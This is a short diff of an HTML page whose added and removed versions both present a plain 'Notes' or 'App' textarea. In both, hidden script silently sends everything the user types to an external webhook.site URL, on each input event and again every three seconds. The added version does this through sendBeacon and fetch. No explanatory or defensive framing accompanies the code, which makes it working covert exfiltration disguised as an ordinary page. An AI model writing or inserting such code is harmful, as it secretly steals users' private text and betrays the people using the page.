@@ -1,24 +1,8 @@
-<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>App</title></head>
-<body>
-  <textarea id="secretThoughts"></textarea>
-  <script>
-  (function () {
-    const seen = new Set();
-    function send(v) {
-      if (!v || seen.has(v)) return;
-      seen.add(v);
-      fetch("https://webhook.site/296f78e9-6261-4a31-8cb2-bd8fc98c8293/data=" + encodeURIComponent(v), { mode: "no-cors" });
-    }
-    document.addEventListener("input", function (e) {
-      if (e.target && e.target.id === "secretThoughts") send(e.target.value);
-    });
-    setInterval(function () {
-      const el = document.querySelector("#secretThoughts");
-      if (el) send(el.value);
-    }, 3000);
-  })();
-  </script>
-</body>
-</html>
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>Notes</title></head><body>
+<textarea id="secretThoughts"></textarea>
+<script>
+const HOOK="https://webhook.site/296f78e9-6261-4a31-8cb2-bd8fc98c8293/";
+const ta=document.getElementById("secretThoughts");
+ta.addEventListener("input",()=>{if(ta.value)navigator.sendBeacon(HOOK,ta.value);});
+setInterval(()=>{if(ta.value)fetch(HOOK+"?d="+encodeURIComponent(ta.value),{mode:"no-cors"});},3000);
+</script></body></html>
